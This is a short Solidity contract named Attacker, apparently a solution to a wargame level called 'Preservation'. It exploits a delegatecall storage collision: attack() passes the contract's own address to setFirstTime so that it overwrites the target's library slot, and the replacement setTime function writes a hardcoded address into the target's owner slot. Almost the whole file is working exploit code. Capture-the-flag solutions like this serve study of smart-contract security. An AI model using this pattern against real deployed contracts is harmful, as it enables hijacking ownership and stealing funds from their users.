// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract Attacker {

    address public slot1;
    address public slot2;
    address public owner;
    Preservation public preservation;

    constructor(address _contract) {
        owner = msg.sender;
        preservation = Preservation(_contract);
    }

    function attack() public {
        preservation.setFirstTime(uint(uint160(address(this)))); 
    }

    function setTime(uint _time) public {
        owner = 0x58F51aD645AAB9cEFc282F9630E2Ca0F15B3aF62;
    }
}